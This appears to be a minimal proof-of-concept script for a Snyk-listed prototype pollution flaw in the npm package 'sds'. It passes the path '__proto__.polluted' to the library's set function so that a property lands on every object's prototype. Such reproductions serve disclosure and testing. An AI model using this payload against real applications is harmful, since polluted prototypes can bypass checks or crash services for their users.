//https://snyk.io/vuln/SNYK-JS-SDS-564123
 
  const root = require("sds");

  obj = {};
  let payload = "__proto__.polluted";

   

  root.set({}, payload, true);
// End of file
